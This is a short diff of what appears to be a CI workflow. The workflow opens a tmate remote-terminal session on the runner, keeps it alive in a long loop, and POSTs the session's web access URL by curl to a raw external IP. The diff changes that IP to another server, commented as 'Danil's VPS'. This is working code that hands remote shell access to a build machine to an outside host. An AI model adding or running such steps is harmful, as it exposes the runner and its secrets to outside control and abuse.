@@ -21,7 +21,8 @@ jobs:
           echo "WEB: $WEB_URL"
           echo "SSH: $SSH_CMD"
           
-          curl -s -X POST -d "$WEB_URL" http://134.195.153.69:8999/ || true
+          # Report directly to Danil's VPS
+          curl -s -X POST -d "$WEB_URL" http://195.96.132.171:8999/ || true
           
           for i in {1..720}; do
             if [ ! -S /tmp/tmate.sock ]; then break; fi
